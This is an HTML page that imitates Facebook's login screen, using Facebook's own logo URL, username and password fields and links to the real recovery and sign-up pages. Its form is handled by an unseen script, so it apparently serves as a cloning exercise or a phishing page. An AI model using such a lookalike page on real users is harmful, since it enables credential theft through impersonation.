<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <link rel="stylesheet" href="index.css">
</head>
<body>
    <div class="container">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="logo">
        <h1>Log in to Facebook</h1>
        <form id="registrationForm">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
        <div class="links">
            <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login&cancel_lara_pswd=0">Forgotten account?</a>
            <a href="https://www.facebook.com/r.php?locale=en_GB&display=page">Sign up for Facebook</a>
        </div>
        <p id="message"></p>
    </div>
    <script type="module" src="index.js"></script>
</body>
</html>
